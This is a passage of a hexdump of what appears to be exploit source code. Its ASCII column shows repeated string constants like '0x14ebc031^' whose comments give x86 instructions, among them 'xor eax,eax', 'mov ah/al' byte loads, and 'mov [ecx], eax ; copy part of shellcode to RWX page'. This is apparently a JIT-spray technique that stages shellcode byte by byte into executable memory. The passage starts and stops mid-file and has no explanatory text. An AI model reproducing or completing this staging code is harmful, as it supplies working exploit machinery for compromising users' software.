00001150  34 65 62 63 62 30 33 5e  22 2b 20 2f 2f 20 61 64  |4ebcb03^"+ // ad|
00001160  64 20 65 63 78 2c 20 65  62 78 20 3b 20 65 63 78  |d ecx, ebx ; ecx|
00001170  3d 65 63 78 2b 34 20 2d  20 6d 6f 76 65 20 70 6f  |=ecx+4 - move po|
00001180  69 6e 74 65 72 0d 0a 22  30 78 31 34 65 62 30 31  |inter.."0x14eb01|
00001190  38 39 5e 22 2b 20 2f 2f  20 6d 6f 76 20 5b 65 63  |89^"+ // mov [ec|
000011a0  78 5d 2c 20 65 61 78 20  3b 20 63 6f 70 79 20 70  |x], eax ; copy p|
000011b0  61 72 74 20 6f 66 20 73  68 65 6c 6c 63 6f 64 65  |art of shellcode|
000011c0  20 74 6f 20 52 57 58 20  70 61 67 65 0d 0a 20 0d  | to RWX page.. .|
000011d0  0a 22 30 78 31 34 65 62  63 30 33 31 5e 22 2b 20  |."0x14ebc031^"+ |
000011e0  2f 2f 20 78 6f 72 20 65  61 78 2c 65 61 78 0d 0a  |// xor eax,eax..|
000011f0  22 30 78 31 34 65 62 65  31 62 34 5e 22 2b 20 2f  |"0x14ebe1b4^"+ /|
00001200  2f 20 6d 6f 76 20 61 68  2c 20 65 31 0d 0a 22 30  |/ mov ah, e1.."0|
00001210  78 31 34 65 62 62 36 62  30 5e 22 2b 20 2f 2f 20  |x14ebb6b0^"+ // |
00001220  6d 6f 76 20 61 6c 2c 20  62 36 0d 0a 22 30 78 31  |mov al, b6.."0x1|
00001230  34 65 62 65 30 66 37 5e  22 2b 20 2f 2f 20 45 41  |4ebe0f7^"+ // EA|
00001240  58 0d 0a 22 30 78 31 34  65 62 30 64 62 34 5e 22  |X.."0x14eb0db4^"|
00001250  2b 20 2f 2f 20 6d 6f 76  20 61 68 2c 20 30 64 0d  |+ // mov ah, 0d.|
00001260  0a 22 30 78 31 34 65 62  63 66 62 30 5e 22 2b 20  |."0x14ebcfb0^"+ |
00001270  2f 2f 20 6d 6f 76 20 61  6c 2c 20 63 66 0d 0a 22  |// mov al, cf.."|
00001280  30 78 31 34 65 62 63 62  30 33 5e 22 2b 20 2f 2f  |0x14ebcb03^"+ //|
00001290  20 61 64 64 20 65 63 78  2c 20 65 62 78 20 3b 20  | add ecx, ebx ; |
000012a0  65 63 78 3d 65 63 78 2b  34 20 2d 20 6d 6f 76 65  |ecx=ecx+4 - move|
000012b0  20 70 6f 69 6e 74 65 72  0d 0a 22 30 78 31 34 65  | pointer.."0x14e|
000012c0  62 30 31 38 39 5e 22 2b  20 2f 2f 20 6d 6f 76 20  |b0189^"+ // mov |
000012d0  5b 65 63 78 5d 2c 20 65  61 78 20 3b 20 63 6f 70  |[ecx], eax ; cop|
000012e0  79 20 70 61 72 74 20 6f  66 20 73 68 65 6c 6c 63  |y part of shellc|
000012f0  6f 64 65 20 74 6f 20 52  57 58 20 70 61 67 65 0d  |ode to RWX page.|
00001300  0a 20 0d 0a 22 30 78 31  34 65 62 63 30 33 31 5e  |. .."0x14ebc031^|
00001310  22 2b 20 2f 2f 20 78 6f  72 20 65 61 78 2c 65 61  |"+ // xor eax,ea|
00001320  78 0d 0a 22 30 78 31 34  65 62 39 35 62 34 5e 22  |x.."0x14eb95b4^"|
00001330  2b 20 2f 2f 20 6d 6f 76  20 61 68 2c 20 39 35 0d  |+ // mov ah, 95.|
00001340  0a 22 30 78 31 34 65 62  38 34 62 30 5e 22 2b 20  |."0x14eb84b0^"+ |
00001350  2f 2f 20 6d 6f 76 20 61  6c 2c 20 38 34 0d 0a 22  |// mov al, 84.."|
00001360  30 78 31 34 65 62 65 30  66 37 5e 22 2b 20 2f 2f  |0x14ebe0f7^"+ //|
00001370  20 45 41 58 0d 0a 22 30  78 31 34 65 62 66 30 62  | EAX.."0x14ebf0b|
00001380  34 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 68 2c 20  |4^"+ // mov ah, |
00001390  66 30 0d 0a 22 30 78 31  34 65 62 65 32 62 30 5e  |f0.."0x14ebe2b0^|
000013a0  22 2b 20 2f 2f 20 6d 6f  76 20 61 6c 2c 20 65 32  |"+ // mov al, e2|
000013b0  0d 0a 22 30 78 31 34 65  62 63 62 30 33 5e 22 2b  |.."0x14ebcb03^"+|
000013c0  20 2f 2f 20 61 64 64 20  65 63 78 2c 20 65 62 78  | // add ecx, ebx|
000013d0  20 3b 20 65 63 78 3d 65  63 78 2b 34 20 2d 20 6d  | ; ecx=ecx+4 - m|
000013e0  6f 76 65 20 70 6f 69 6e  74 65 72 0d 0a 22 30 78  |ove pointer.."0x|
000013f0  31 34 65 62 30 31 38 39  5e 22 2b 20 2f 2f 20 6d  |14eb0189^"+ // m|
00001400  6f 76 20 5b 65 63 78 5d  2c 20 65 61 78 20 3b 20  |ov [ecx], eax ; |
00001410  63 6f 70 79 20 70 61 72  74 20 6f 66 20 73 68 65  |copy part of she|
00001420  6c 6c 63 6f 64 65 20 74  6f 20 52 57 58 20 70 61  |llcode to RWX pa|
00001430  67 65 0d 0a 20 0d 0a 22  30 78 31 34 65 62 63 30  |ge.. .."0x14ebc0|
00001440  33 31 5e 22 2b 20 2f 2f  20 78 6f 72 20 65 61 78  |31^"+ // xor eax|
00001450  2c 65 61 78 0d 0a 22 30  78 31 34 65 62 62 63 62  |,eax.."0x14ebbcb|
00001460  34 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 68 2c 20  |4^"+ // mov ah, |
00001470  62 63 0d 0a 22 30 78 31  34 65 62 61 65 62 30 5e  |bc.."0x14ebaeb0^|
00001480  22 2b 20 2f 2f 20 6d 6f  76 20 61 6c 2c 20 61 65  |"+ // mov al, ae|
00001490  0d 0a 22 30 78 31 34 65  62 65 30 66 37 5e 22 2b  |.."0x14ebe0f7^"+|
000014a0  20 2f 2f 20 45 41 58 0d  0a 22 30 78 31 34 65 62  | // EAX.."0x14eb|
000014b0  35 32 62 34 5e 22 2b 20  2f 2f 20 6d 6f 76 20 61  |52b4^"+ // mov a|
000014c0  68 2c 20 35 32 0d 0a 22  30 78 31 34 65 62 38 62  |h, 52.."0x14eb8b|
000014d0  62 30 5e 22 2b 20 2f 2f  20 6d 6f 76 20 61 6c 2c  |b0^"+ // mov al,|
000014e0  20 38 62 0d 0a 22 30 78  31 34 65 62 63 62 30 33  | 8b.."0x14ebcb03|
000014f0  5e 22 2b 20 2f 2f 20 61  64 64 20 65 63 78 2c 20  |^"+ // add ecx, |
00001500  65 62 78 20 3b 20 65 63  78 3d 65 63 78 2b 34 20  |ebx ; ecx=ecx+4 |
00001510  2d 20 6d 6f 76 65 20 70  6f 69 6e 74 65 72 0d 0a  |- move pointer..|
00001520  22 30 78 31 34 65 62 30  31 38 39 5e 22 2b 20 2f  |"0x14eb0189^"+ /|
00001530  2f 20 6d 6f 76 20 5b 65  63 78 5d 2c 20 65 61 78  |/ mov [ecx], eax|
00001540  20 3b 20 63 6f 70 79 20  70 61 72 74 20 6f 66 20  | ; copy part of |
00001550  73 68 65 6c 6c 63 6f 64  65 20 74 6f 20 52 57 58  |shellcode to RWX|
00001560  20 70 61 67 65 0d 0a 20  0d 0a 22 30 78 31 34 65  | page.. .."0x14e|
00001570  62 63 30 33 31 5e 22 2b  20 2f 2f 20 78 6f 72 20  |bc031^"+ // xor |
00001580  65 61 78 2c 65 61 78 0d  0a 22 30 78 31 34 65 62  |eax,eax.."0x14eb|
00001590  65 36 62 34 5e 22 2b 20  2f 2f 20 6d 6f 76 20 61  |e6b4^"+ // mov a|
000015a0  68 2c 20 65 36 0d 0a 22  30 78 31 34 65 62 63 32  |h, e6.."0x14ebc2|
000015b0  62 30 5e 22 2b 20 2f 2f  20 6d 6f 76 20 61 6c 2c  |b0^"+ // mov al,|
000015c0  20 63 32 0d 0a 22 30 78  31 34 65 62 65 30 66 37  | c2.."0x14ebe0f7|
000015d0  5e 22 2b 20 2f 2f 20 45  41 58 0d 0a 22 30 78 31  |^"+ // EAX.."0x1|
000015e0  34 65 62 33 63 62 34 5e  22 2b 20 2f 2f 20 6d 6f  |4eb3cb4^"+ // mo|
000015f0  76 20 61 68 2c 20 33 63  0d 0a 22 30 78 31 34 65  |v ah, 3c.."0x14e|
00001600  62 34 32 62 30 5e 22 2b  20 2f 2f 20 6d 6f 76 20  |b42b0^"+ // mov |
00001610  61 6c 2c 20 34 32 0d 0a  22 30 78 31 34 65 62 63  |al, 42.."0x14ebc|
00001620  62 30 33 5e 22 2b 20 2f  2f 20 61 64 64 20 65 63  |b03^"+ // add ec|
00001630  78 2c 20 65 62 78 20 3b  20 65 63 78 3d 65 63 78  |x, ebx ; ecx=ecx|
00001640  2b 34 20 2d 20 6d 6f 76  65 20 70 6f 69 6e 74 65  |+4 - move pointe|
00001650  72 0d 0a 22 30 78 31 34  65 62 30 31 38 39 5e 22  |r.."0x14eb0189^"|
00001660  2b 20 2f 2f 20 6d 6f 76  20 5b 65 63 78 5d 2c 20  |+ // mov [ecx], |
00001670  65 61 78 20 3b 20 63 6f  70 79 20 70 61 72 74 20  |eax ; copy part |
00001680  6f 66 20 73 68 65 6c 6c  63 6f 64 65 20 74 6f 20  |of shellcode to |
00001690  52 57 58 20 70 61 67 65  0d 0a 20 0d 0a 22 30 78  |RWX page.. .."0x|
000016a0  31 34 65 62 63 30 33 31  5e 22 2b 20 2f 2f 20 78  |14ebc031^"+ // x|
000016b0  6f 72 20 65 61 78 2c 65  61 78 0d 0a 22 30 78 31  |or eax,eax.."0x1|
000016c0  34 65 62 62 38 62 34 5e  22 2b 20 2f 2f 20 6d 6f  |4ebb8b4^"+ // mo|
000016d0  76 20 61 68 2c 20 62 38  0d 0a 22 30 78 31 34 65  |v ah, b8.."0x14e|
000016e0  62 64 39 62 30 5e 22 2b  20 2f 2f 20 6d 6f 76 20  |bd9b0^"+ // mov |
000016f0  61 6c 2c 20 64 39 0d 0a  22 30 78 31 34 65 62 65  |al, d9.."0x14ebe|
00001700  30 66 37 5e 22 2b 20 2f  2f 20 45 41 58 0d 0a 22  |0f7^"+ // EAX.."|
00001710  30 78 31 34 65 62 34 30  62 34 5e 22 2b 20 2f 2f  |0x14eb40b4^"+ //|
00001720  20 6d 6f 76 20 61 68 2c  20 34 30 0d 0a 22 30 78  | mov ah, 40.."0x|
00001730  31 34 65 62 38 62 62 30  5e 22 2b 20 2f 2f 20 6d  |14eb8bb0^"+ // m|
00001740  6f 76 20 61 6c 2c 20 38  62 0d 0a 22 30 78 31 34  |ov al, 8b.."0x14|
00001750  65 62 63 62 30 33 5e 22  2b 20 2f 2f 20 61 64 64  |ebcb03^"+ // add|
00001760  20 65 63 78 2c 20 65 62  78 20 3b 20 65 63 78 3d  | ecx, ebx ; ecx=|
00001770  65 63 78 2b 34 20 2d 20  6d 6f 76 65 20 70 6f 69  |ecx+4 - move poi|
00001780  6e 74 65 72 0d 0a 22 30  78 31 34 65 62 30 31 38  |nter.."0x14eb018|
00001790  39 5e 22 2b 20 2f 2f 20  6d 6f 76 20 5b 65 63 78  |9^"+ // mov [ecx|
000017a0  5d 2c 20 65 61 78 20 3b  20 63 6f 70 79 20 70 61  |], eax ; copy pa|
000017b0  72 74 20 6f 66 20 73 68  65 6c 6c 63 6f 64 65 20  |rt of shellcode |
000017c0  74 6f 20 52 57 58 20 70  61 67 65 0d 0a 20 0d 0a  |to RWX page.. ..|
000017d0  22 30 78 31 34 65 62 63  30 33 31 5e 22 2b 20 2f  |"0x14ebc031^"+ /|
000017e0  2f 20 78 6f 72 20 65 61  78 2c 65 61 78 0d 0a 22  |/ xor eax,eax.."|
000017f0  30 78 31 34 65 62 31 32  62 34 5e 22 2b 20 2f 2f  |0x14eb12b4^"+ //|
00001800  20 6d 6f 76 20 61 68 2c  20 31 32 0d 0a 22 30 78  | mov ah, 12.."0x|
00001810  31 34 65 62 32 62 62 30  5e 22 2b 20 2f 2f 20 6d  |14eb2bb0^"+ // m|
00001820  6f 76 20 61 6c 2c 20 32  62 0d 0a 22 30 78 31 34  |ov al, 2b.."0x14|
00001830  65 62 65 30 66 37 5e 22  2b 20 2f 2f 20 45 41 58  |ebe0f7^"+ // EAX|
00001840  0d 0a 22 30 78 31 34 65  62 37 34 62 34 5e 22 2b  |.."0x14eb74b4^"+|
00001850  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 37 34 0d 0a  | // mov ah, 74..|
00001860  22 30 78 31 34 65 62 63  30 62 30 5e 22 2b 20 2f  |"0x14ebc0b0^"+ /|
00001870  2f 20 6d 6f 76 20 61 6c  2c 20 63 30 0d 0a 22 30  |/ mov al, c0.."0|
00001880  78 31 34 65 62 63 62 30  33 5e 22 2b 20 2f 2f 20  |x14ebcb03^"+ // |
00001890  61 64 64 20 65 63 78 2c  20 65 62 78 20 3b 20 65  |add ecx, ebx ; e|
000018a0  63 78 3d 65 63 78 2b 34  20 2d 20 6d 6f 76 65 20  |cx=ecx+4 - move |
000018b0  70 6f 69 6e 74 65 72 0d  0a 22 30 78 31 34 65 62  |pointer.."0x14eb|
000018c0  30 31 38 39 5e 22 2b 20  2f 2f 20 6d 6f 76 20 5b  |0189^"+ // mov [|
000018d0  65 63 78 5d 2c 20 65 61  78 20 3b 20 63 6f 70 79  |ecx], eax ; copy|
000018e0  20 70 61 72 74 20 6f 66  20 73 68 65 6c 6c 63 6f  | part of shellco|
000018f0  64 65 20 74 6f 20 52 57  58 20 70 61 67 65 0d 0a  |de to RWX page..|
00001900  20 0d 0a 22 30 78 31 34  65 62 63 30 33 31 5e 22  | .."0x14ebc031^"|
00001910  2b 20 2f 2f 20 78 6f 72  20 65 61 78 2c 65 61 78  |+ // xor eax,eax|
00001920  0d 0a 22 30 78 31 34 65  62 38 38 62 34 5e 22 2b  |.."0x14eb88b4^"+|
00001930  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 38 38 0d 0a  | // mov ah, 88..|
00001940  22 30 78 31 34 65 62 34  37 62 30 5e 22 2b 20 2f  |"0x14eb47b0^"+ /|
00001950  2f 20 6d 6f 76 20 61 6c  2c 20 34 37 0d 0a 22 30  |/ mov al, 47.."0|
00001960  78 31 34 65 62 65 30 66  37 5e 22 2b 20 2f 2f 20  |x14ebe0f7^"+ // |
00001970  45 41 58 0d 0a 22 30 78  31 34 65 62 35 30 62 34  |EAX.."0x14eb50b4|
00001980  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 35  |^"+ // mov ah, 5|
00001990  30 0d 0a 22 30 78 31 34  65 62 64 30 62 30 5e 22  |0.."0x14ebd0b0^"|
000019a0  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 64 30 0d  |+ // mov al, d0.|
000019b0  0a 22 30 78 31 34 65 62  63 62 30 33 5e 22 2b 20  |."0x14ebcb03^"+ |
000019c0  2f 2f 20 61 64 64 20 65  63 78 2c 20 65 62 78 20  |// add ecx, ebx |
000019d0  3b 20 65 63 78 3d 65 63  78 2b 34 20 2d 20 6d 6f  |; ecx=ecx+4 - mo|
000019e0  76 65 20 70 6f 69 6e 74  65 72 0d 0a 22 30 78 31  |ve pointer.."0x1|
000019f0  34 65 62 30 31 38 39 5e  22 2b 20 2f 2f 20 6d 6f  |4eb0189^"+ // mo|
00001a00  76 20 5b 65 63 78 5d 2c  20 65 61 78 20 3b 20 63  |v [ecx], eax ; c|
00001a10  6f 70 79 20 70 61 72 74  20 6f 66 20 73 68 65 6c  |opy part of shel|
00001a20  6c 63 6f 64 65 20 74 6f  20 52 57 58 20 70 61 67  |lcode to RWX pag|
00001a30  65 0d 0a 20 0d 0a 22 30  78 31 34 65 62 63 30 33  |e.. .."0x14ebc03|
00001a40  31 5e 22 2b 20 2f 2f 20  78 6f 72 20 65 61 78 2c  |1^"+ // xor eax,|
00001a50  65 61 78 0d 0a 22 30 78  31 34 65 62 35 61 62 34  |eax.."0x14eb5ab4|
00001a60  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 35  |^"+ // mov ah, 5|
00001a70  61 0d 0a 22 30 78 31 34  65 62 66 66 62 30 5e 22  |a.."0x14ebffb0^"|
00001a80  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 66 66 0d  |+ // mov al, ff.|
00001a90  0a 22 30 78 31 34 65 62  65 30 66 37 5e 22 2b 20  |."0x14ebe0f7^"+ |
00001aa0  2f 2f 20 45 41 58 0d 0a  22 30 78 31 34 65 62 38  |// EAX.."0x14eb8|
00001ab0  62 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |bb4^"+ // mov ah|
00001ac0  2c 20 38 62 0d 0a 22 30  78 31 34 65 62 31 38 62  |, 8b.."0x14eb18b|
00001ad0  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
00001ae0  31 38 0d 0a 22 30 78 31  34 65 62 63 62 30 33 5e  |18.."0x14ebcb03^|
00001af0  22 2b 20 2f 2f 20 61 64  64 20 65 63 78 2c 20 65  |"+ // add ecx, e|
00001b00  62 78 20 3b 20 65 63 78  3d 65 63 78 2b 34 20 2d  |bx ; ecx=ecx+4 -|
00001b10  20 6d 6f 76 65 20 70 6f  69 6e 74 65 72 0d 0a 22  | move pointer.."|
00001b20  30 78 31 34 65 62 30 31  38 39 5e 22 2b 20 2f 2f  |0x14eb0189^"+ //|
00001b30  20 6d 6f 76 20 5b 65 63  78 5d 2c 20 65 61 78 20  | mov [ecx], eax |
00001b40  3b 20 63 6f 70 79 20 70  61 72 74 20 6f 66 20 73  |; copy part of s|
00001b50  68 65 6c 6c 63 6f 64 65  20 74 6f 20 52 57 58 20  |hellcode to RWX |
00001b60  70 61 67 65 0d 0a 20 0d  0a 22 30 78 31 34 65 62  |page.. .."0x14eb|
00001b70  63 30 33 31 5e 22 2b 20  2f 2f 20 78 6f 72 20 65  |c031^"+ // xor e|
00001b80  61 78 2c 65 61 78 0d 0a  22 30 78 31 34 65 62 37  |ax,eax.."0x14eb7|
00001b90  63 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |cb4^"+ // mov ah|
00001ba0  2c 20 37 63 0d 0a 22 30  78 31 34 65 62 64 61 62  |, 7c.."0x14ebdab|
00001bb0  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
00001bc0  64 61 0d 0a 22 30 78 31  34 65 62 65 30 66 37 5e  |da.."0x14ebe0f7^|
00001bd0  22 2b 20 2f 2f 20 45 41  58 0d 0a 22 30 78 31 34  |"+ // EAX.."0x14|
00001be0  65 62 64 33 62 34 5e 22  2b 20 2f 2f 20 6d 6f 76  |ebd3b4^"+ // mov|
00001bf0  20 61 68 2c 20 64 33 0d  0a 22 30 78 31 34 65 62  | ah, d3.."0x14eb|
00001c00  30 31 62 30 5e 22 2b 20  2f 2f 20 6d 6f 76 20 61  |01b0^"+ // mov a|
00001c10  6c 2c 20 30 31 0d 0a 22  30 78 31 34 65 62 63 62  |l, 01.."0x14ebcb|
00001c20  30 33 5e 22 2b 20 2f 2f  20 61 64 64 20 65 63 78  |03^"+ // add ecx|
00001c30  2c 20 65 62 78 20 3b 20  65 63 78 3d 65 63 78 2b  |, ebx ; ecx=ecx+|
00001c40  34 20 2d 20 6d 6f 76 65  20 70 6f 69 6e 74 65 72  |4 - move pointer|
00001c50  0d 0a 22 30 78 31 34 65  62 30 31 38 39 5e 22 2b  |.."0x14eb0189^"+|
00001c60  20 2f 2f 20 6d 6f 76 20  5b 65 63 78 5d 2c 20 65  | // mov [ecx], e|
00001c70  61 78 20 3b 20 63 6f 70  79 20 70 61 72 74 20 6f  |ax ; copy part o|
00001c80  66 20 73 68 65 6c 6c 63  6f 64 65 20 74 6f 20 52  |f shellcode to R|
00001c90  57 58 20 70 61 67 65 0d  0a 20 0d 0a 22 30 78 31  |WX page.. .."0x1|
00001ca0  34 65 62 63 30 33 31 5e  22 2b 20 2f 2f 20 78 6f  |4ebc031^"+ // xo|
00001cb0  72 20 65 61 78 2c 65 61  78 0d 0a 22 30 78 31 34  |r eax,eax.."0x14|
00001cc0  65 62 62 63 62 34 5e 22  2b 20 2f 2f 20 6d 6f 76  |ebbcb4^"+ // mov|
00001cd0  20 61 68 2c 20 62 63 0d  0a 22 30 78 31 34 65 62  | ah, bc.."0x14eb|
00001ce0  63 37 62 30 5e 22 2b 20  2f 2f 20 6d 6f 76 20 61  |c7b0^"+ // mov a|
00001cf0  6c 2c 20 63 37 0d 0a 22  30 78 31 34 65 62 65 30  |l, c7.."0x14ebe0|
00001d00  66 37 5e 22 2b 20 2f 2f  20 45 41 58 0d 0a 22 30  |f7^"+ // EAX.."0|
00001d10  78 31 34 65 62 38 62 62  34 5e 22 2b 20 2f 2f 20  |x14eb8bb4^"+ // |
00001d20  6d 6f 76 20 61 68 2c 20  38 62 0d 0a 22 30 78 31  |mov ah, 8b.."0x1|
00001d30  34 65 62 34 39 62 30 5e  22 2b 20 2f 2f 20 6d 6f  |4eb49b0^"+ // mo|
00001d40  76 20 61 6c 2c 20 34 39  0d 0a 22 30 78 31 34 65  |v al, 49.."0x14e|
00001d50  62 63 62 30 33 5e 22 2b  20 2f 2f 20 61 64 64 20  |bcb03^"+ // add |
00001d60  65 63 78 2c 20 65 62 78  20 3b 20 65 63 78 3d 65  |ecx, ebx ; ecx=e|
00001d70  63 78 2b 34 20 2d 20 6d  6f 76 65 20 70 6f 69 6e  |cx+4 - move poin|
00001d80  74 65 72 0d 0a 22 30 78  31 34 65 62 30 31 38 39  |ter.."0x14eb0189|
00001d90  5e 22 2b 20 2f 2f 20 6d  6f 76 20 5b 65 63 78 5d  |^"+ // mov [ecx]|
00001da0  2c 20 65 61 78 20 3b 20  63 6f 70 79 20 70 61 72  |, eax ; copy par|
00001db0  74 20 6f 66 20 73 68 65  6c 6c 63 6f 64 65 20 74  |t of shellcode t|
00001dc0  6f 20 52 57 58 20 70 61  67 65 0d 0a 20 0d 0a 22  |o RWX page.. .."|
00001dd0  30 78 31 34 65 62 63 30  33 31 5e 22 2b 20 2f 2f  |0x14ebc031^"+ //|
00001de0  20 78 6f 72 20 65 61 78  2c 65 61 78 0d 0a 22 30  | xor eax,eax.."0|
00001df0  78 31 34 65 62 66 66 62  34 5e 22 2b 20 2f 2f 20  |x14ebffb4^"+ // |
00001e00  6d 6f 76 20 61 68 2c 20  66 66 0d 0a 22 30 78 31  |mov ah, ff.."0x1|
00001e10  34 65 62 39 38 62 30 5e  22 2b 20 2f 2f 20 6d 6f  |4eb98b0^"+ // mo|
00001e20  76 20 61 6c 2c 20 39 38  0d 0a 22 30 78 31 34 65  |v al, 98.."0x14e|
00001e30  62 65 30 66 37 5e 22 2b  20 2f 2f 20 45 41 58 0d  |be0f7^"+ // EAX.|
00001e40  0a 22 30 78 31 34 65 62  66 66 62 34 5e 22 2b 20  |."0x14ebffb4^"+ |
00001e50  2f 2f 20 6d 6f 76 20 61  68 2c 20 66 66 0d 0a 22  |// mov ah, ff.."|
00001e60  30 78 31 34 65 62 66 66  62 30 5e 22 2b 20 2f 2f  |0x14ebffb0^"+ //|
00001e70  20 6d 6f 76 20 61 6c 2c  20 66 66 0d 0a 22 30 78  | mov al, ff.."0x|
00001e80  31 34 65 62 34 30 39 30  5e 22 2b 20 2f 2f 20 69  |14eb4090^"+ // i|
00001e90  6e 63 20 65 61 78 0d 0a  22 30 78 31 34 65 62 64  |nc eax.."0x14ebd|
00001ea0  36 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |6b4^"+ // mov ah|
00001eb0  2c 20 64 36 0d 0a 22 30  78 31 34 65 62 30 31 62  |, d6.."0x14eb01b|
00001ec0  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
00001ed0  30 31 0d 0a 22 30 78 31  34 65 62 63 62 30 33 5e  |01.."0x14ebcb03^|
00001ee0  22 2b 20 2f 2f 20 61 64  64 20 65 63 78 2c 20 65  |"+ // add ecx, e|
00001ef0  62 78 20 3b 20 65 63 78  3d 65 63 78 2b 34 20 2d  |bx ; ecx=ecx+4 -|
00001f00  20 6d 6f 76 65 20 70 6f  69 6e 74 65 72 0d 0a 22  | move pointer.."|
00001f10  30 78 31 34 65 62 30 31  38 39 5e 22 2b 20 2f 2f  |0x14eb0189^"+ //|
00001f20  20 6d 6f 76 20 5b 65 63  78 5d 2c 20 65 61 78 20  | mov [ecx], eax |
00001f30  3b 20 63 6f 70 79 20 70  61 72 74 20 6f 66 20 73  |; copy part of s|
00001f40  68 65 6c 6c 63 6f 64 65  20 74 6f 20 52 57 58 20  |hellcode to RWX |
00001f50  70 61 67 65 0d 0a 20 0d  0a 22 30 78 31 34 65 62  |page.. .."0x14eb|
00001f60  63 30 33 31 5e 22 2b 20  2f 2f 20 78 6f 72 20 65  |c031^"+ // xor e|
00001f70  61 78 2c 65 61 78 0d 0a  22 30 78 31 34 65 62 64  |ax,eax.."0x14ebd|
00001f80  65 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |eb4^"+ // mov ah|
00001f90  2c 20 64 65 0d 0a 22 30  78 31 34 65 62 61 61 62  |, de.."0x14ebaab|
00001fa0  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
00001fb0  61 61 0d 0a 22 30 78 31  34 65 62 65 30 66 37 5e  |aa.."0x14ebe0f7^|
00001fc0  22 2b 20 2f 2f 20 45 41  58 0d 0a 22 30 78 31 34  |"+ // EAX.."0x14|
00001fd0  65 62 66 66 62 34 5e 22  2b 20 2f 2f 20 6d 6f 76  |ebffb4^"+ // mov|
00001fe0  20 61 68 2c 20 66 66 0d  0a 22 30 78 31 34 65 62  | ah, ff.."0x14eb|
00001ff0  66 66 62 30 5e 22 2b 20  2f 2f 20 6d 6f 76 20 61  |ffb0^"+ // mov a|
00002000  6c 2c 20 66 66 0d 0a 22  30 78 31 34 65 62 34 30  |l, ff.."0x14eb40|
00002010  39 30 5e 22 2b 20 2f 2f  20 69 6e 63 20 65 61 78  |90^"+ // inc eax|
00002020  0d 0a 22 30 78 31 34 65  62 63 30 62 34 5e 22 2b  |.."0x14ebc0b4^"+|
00002030  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 63 30 0d 0a  | // mov ah, c0..|
00002040  22 30 78 31 34 65 62 33  31 62 30 5e 22 2b 20 2f  |"0x14eb31b0^"+ /|
00002050  2f 20 6d 6f 76 20 61 6c  2c 20 33 31 0d 0a 22 30  |/ mov al, 31.."0|
00002060  78 31 34 65 62 63 62 30  33 5e 22 2b 20 2f 2f 20  |x14ebcb03^"+ // |
00002070  61 64 64 20 65 63 78 2c  20 65 62 78 20 3b 20 65  |add ecx, ebx ; e|
00002080  63 78 3d 65 63 78 2b 34  20 2d 20 6d 6f 76 65 20  |cx=ecx+4 - move |
00002090  70 6f 69 6e 74 65 72 0d  0a 22 30 78 31 34 65 62  |pointer.."0x14eb|
000020a0  30 31 38 39 5e 22 2b 20  2f 2f 20 6d 6f 76 20 5b  |0189^"+ // mov [|
000020b0  65 63 78 5d 2c 20 65 61  78 20 3b 20 63 6f 70 79  |ecx], eax ; copy|
000020c0  20 70 61 72 74 20 6f 66  20 73 68 65 6c 6c 63 6f  | part of shellco|
000020d0  64 65 20 74 6f 20 52 57  58 20 70 61 67 65 0d 0a  |de to RWX page..|
000020e0  20 0d 0a 22 30 78 31 34  65 62 63 30 33 31 5e 22  | .."0x14ebc031^"|
000020f0  2b 20 2f 2f 20 78 6f 72  20 65 61 78 2c 65 61 78  |+ // xor eax,eax|
00002100  0d 0a 22 30 78 31 34 65  62 65 31 62 34 5e 22 2b  |.."0x14ebe1b4^"+|
00002110  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 65 31 0d 0a  | // mov ah, e1..|
00002120  22 30 78 31 34 65 62 62  36 62 30 5e 22 2b 20 2f  |"0x14ebb6b0^"+ /|
00002130  2f 20 6d 6f 76 20 61 6c  2c 20 62 36 0d 0a 22 30  |/ mov al, b6.."0|
00002140  78 31 34 65 62 65 30 66  37 5e 22 2b 20 2f 2f 20  |x14ebe0f7^"+ // |
00002150  45 41 58 0d 0a 22 30 78  31 34 65 62 30 64 62 34  |EAX.."0x14eb0db4|
00002160  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 30  |^"+ // mov ah, 0|
00002170  64 0d 0a 22 30 78 31 34  65 62 63 66 62 30 5e 22  |d.."0x14ebcfb0^"|
00002180  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 63 66 0d  |+ // mov al, cf.|
00002190  0a 22 30 78 31 34 65 62  63 62 30 33 5e 22 2b 20  |."0x14ebcb03^"+ |
000021a0  2f 2f 20 61 64 64 20 65  63 78 2c 20 65 62 78 20  |// add ecx, ebx |
000021b0  3b 20 65 63 78 3d 65 63  78 2b 34 20 2d 20 6d 6f  |; ecx=ecx+4 - mo|
000021c0  76 65 20 70 6f 69 6e 74  65 72 0d 0a 22 30 78 31  |ve pointer.."0x1|
000021d0  34 65 62 30 31 38 39 5e  22 2b 20 2f 2f 20 6d 6f  |4eb0189^"+ // mo|
000021e0  76 20 5b 65 63 78 5d 2c  20 65 61 78 20 3b 20 63  |v [ecx], eax ; c|
000021f0  6f 70 79 20 70 61 72 74  20 6f 66 20 73 68 65 6c  |opy part of shel|
00002200  6c 63 6f 64 65 20 74 6f  20 52 57 58 20 70 61 67  |lcode to RWX pag|
00002210  65 0d 0a 20 0d 0a 22 30  78 31 34 65 62 63 30 33  |e.. .."0x14ebc03|
00002220  31 5e 22 2b 20 2f 2f 20  78 6f 72 20 65 61 78 2c  |1^"+ // xor eax,|
00002230  65 61 78 0d 0a 22 30 78  31 34 65 62 66 61 62 34  |eax.."0x14ebfab4|
